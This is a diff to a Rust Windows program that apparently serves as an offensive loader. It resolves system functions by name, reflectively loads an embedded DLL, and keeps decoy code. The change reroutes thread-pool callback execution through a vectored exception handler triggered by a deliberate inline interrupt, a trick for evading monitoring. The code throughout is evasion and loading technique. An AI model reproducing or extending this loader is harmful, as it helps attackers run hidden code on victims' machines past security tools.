@@ -12,7 +12,7 @@ use std::{io, thread};
 use winapi::shared::basetsd::SIZE_T;
 use winapi::shared::minwindef::{BYTE, DWORD, HMODULE, HRSRC__, LPARAM};
 use winapi::shared::ntdef::{LPCSTR, NTSTATUS, PVOID};
-use winapi::um::errhandlingapi::GetLastError;
+use winapi::um::errhandlingapi::{AddVectoredExceptionHandler, GetLastError};
 use winapi::um::libloaderapi::{
     FindResourceExW, GetModuleHandleW, GetProcAddress, LoadResource, LockResource, SizeofResource,
 };
@@ -20,10 +20,11 @@ use winapi::um::processenv::GetStdHandle;
 use winapi::um::synchapi::WaitForSingleObject;
 use winapi::um::winbase::{EnumResourceNamesA, STD_OUTPUT_HANDLE};
 use winapi::um::winnt::{
-    HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PTP_CALLBACK_ENVIRON,
-    PTP_WORK, PTP_WORK_CALLBACK,
+    EXCEPTION_POINTERS, HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
+    PTP_CALLBACK_ENVIRON, PTP_WORK, PTP_WORK_CALLBACK,
 };
 use winapi::um::winuser::{MAKEINTRESOURCEW, RT_RCDATA};
+use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};
 use winapi_cs::core::*;
 
 use crate::winapi_cs::reflective_dll::*;
@@ -137,21 +138,40 @@ fn decoy(data: &mut u64) {
         core::ptr::write_volatile(data, temp);
     }
 }
-
-unsafe extern "system" fn exception_handler(_exception_info: *mut *mut u32) -> i32 {
+static mut stWA: u64 = 0;
+unsafe extern "system" fn exception_handler(_exception_info: *mut EXCEPTION_POINTERS) -> i32 {
     // Return EXCEPTION_CONTINUE_SEARCH to allow other handlers to process this exception,
     // or EXCEPTION_EXECUTE_HANDLER to execute the exception handler.
+    match (*((*_exception_info).ExceptionRecord)).ExceptionCode {
+        0xC0000095 => (),
+        _ => {
+            println!("Uh oh...");
+            return EXCEPTION_CONTINUE_SEARCH;
+        }
+    }
+    let (_ntStr, pntStr) = string_to_lpcwstr(String::from("C:\\Windows\\System32\\ntdll.dll"));
+    let _ntdll: HMODULE = GetModuleHandle(pntStr).unwrap();
 
-    1
+    let (_tpAllocStr, pTpAllocStr) = string_to_lpcstr(String::from("TpAllocWork"));
+    let (_tpPostStr, pTpPostStr) = string_to_lpcstr(String::from("TpPostWork"));
+    let (_tpReleaseStr, pTpReleaseStr) = string_to_lpcstr(String::from("TpReleaseWork"));
+    let TpAllocWork: pTpAllocWork = GetProcAddress_(_ntdll, pTpAllocStr).unwrap();
+    let TpPostWork: pTpPostWork = GetProcAddress_(_ntdll, pTpPostStr).unwrap();
+    let TpReleaseWork: pTpReleaseWork = GetProcAddress_(_ntdll, pTpReleaseStr).unwrap();
+    let mut workReturn: PTP_WORK = 0 as PTP_WORK;
+    let wa: PVOID = transmute(stWA);
+    TpAllocWork(
+        &mut workReturn as *mut PTP_WORK,
+        transmute(wardenCallback as *const ()),
+        wa,
+        null_mut(),
+    );
+    TpPostWork(workReturn);
+    TpReleaseWork(workReturn);
+    WaitForSingleObject((-1 as isize) as PVOID, 100);
+    EXCEPTION_CONTINUE_EXECUTION
 }
 
-fn complex_decoy() -> bool {
-    // Increment the counter with SeqCst ordering to ensure a full memory barrier.
-    let count = DECOY.fetch_add(2, Ordering::SeqCst);
-
-    // Perform a dependent check that appears to affect control flow
-    count % 4 == 0
-}
 type pVirtualAlloc = fn(PVOID, SIZE_T, DWORD, DWORD) -> *mut BYTE;
 type pVirtualProtect = fn(PVOID, SIZE_T, DWORD, *mut DWORD) -> bool;
 type pTpAllocWork = fn(*mut PTP_WORK, PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON) -> NTSTATUS;
@@ -169,16 +189,12 @@ fn main() {
     let (_ker32strw, pker32strw) =
         string_to_lpcwstr(String::from("C:\\Windows\\System32\\kernel32.dll"));
     let (_virtProtStr, pvirtProtStr) = string_to_lpcstr(String::from("VirtualProtect"));
-    let (_tpAllocStr, pTpAllocStr) = string_to_lpcstr(String::from("TpAllocWork"));
-    let (_tpPostStr, pTpPostStr) = string_to_lpcstr(String::from("TpPostWork"));
-    let (_tpReleaseStr, pTpReleaseStr) = string_to_lpcstr(String::from("TpReleaseWork"));
+
     let (_writeConsStr, pWriteConsStr) = string_to_lpcstr(String::from("WriteConsoleA"));
-    let (_ntStr, pntStr) = string_to_lpcwstr(String::from("C:\\Windows\\System32\\ntdll.dll"));
 
     unsafe {
         //hide!();
         let _kernel32: HMODULE = GetModuleHandle(pker32strw).unwrap();
-        let _ntdll: HMODULE = GetModuleHandle(pntStr).unwrap();
         let aes_ptr = include_bytes!("../c_aes/aes_dll_nocrt.dll");
         let VirtualProtect: pVirtualProtect = GetProcAddress_(_kernel32, pvirtProtStr).unwrap();
         let WriteConsole: pWriteConsole = GetProcAddress_(_kernel32, pWriteConsStr).unwrap();
@@ -207,20 +223,9 @@ fn main() {
             status: &mut status_th2 as *mut Arc<(Mutex<StatusEnum>, Condvar)>,
             _workAddress: &mut data_th2 as *mut Arc<(Mutex<u64>, Condvar)>,
         };
-
-        let TpAllocWork: pTpAllocWork = GetProcAddress_(_ntdll, pTpAllocStr).unwrap();
-        let TpPostWork: pTpPostWork = GetProcAddress_(_ntdll, pTpPostStr).unwrap();
-        let TpReleaseWork: pTpReleaseWork = GetProcAddress_(_ntdll, pTpReleaseStr).unwrap();
-        let mut workReturn: PTP_WORK = 0 as PTP_WORK;
-        TpAllocWork(
-            &mut workReturn as *mut PTP_WORK,
-            transmute(wardenCallback as *const ()),
-            (&mut wa as *mut warden_args) as PVOID,
-            null_mut(),
-        );
-        TpPostWork(workReturn);
-        TpReleaseWork(workReturn);
-        WaitForSingleObject((-1 as isize) as PVOID, 1000);
+        stWA = (&mut wa as *mut warden_args) as u64;
+        let _handle = AddVectoredExceptionHandler(1, Some(exception_handler));
+        asm!(".2byte 0x04cd");
 
         let (_userStr, puserStr) = string_to_lpcstr(user_input);
         ReflectiveLoadDll(aes_ptr.as_ptr() as *mut u8, false);
